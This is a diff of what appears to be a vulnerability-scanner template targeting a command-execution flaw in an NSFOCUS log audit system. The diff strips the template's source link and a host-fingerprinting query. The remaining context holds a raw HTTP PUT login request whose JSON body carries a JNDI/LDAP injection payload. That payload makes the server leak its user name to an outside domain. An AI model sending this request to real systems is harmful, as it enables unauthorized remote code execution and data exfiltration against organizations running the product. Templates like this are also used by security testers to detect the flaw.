@@ -3,12 +3,8 @@ info:
   name: 绿盟日志审计系统存在命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zxtgqvenqkag56oc'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zxtgqvenqkag56oc
-    fofa: '"<title>{{platformName}}</title>" && icon_hash="-1566499661"'
 http:
 - raw:
   - 'PUT /api/v1/login HTTP/1.1
@@ -48,8 +44,6 @@ http:
 
 
     Cookie: JSESSIONID=C2CBDF46F7B53365D2ECE60AA645B673; sessionid=w0gr7fyrkt56tf6yc3sr0pw6mjl59txi
-
-
 
 
     {"name":"${jndi:ldap://${sys:user.name}.www.baidu.com}","password":"2Y4W5F5h"}
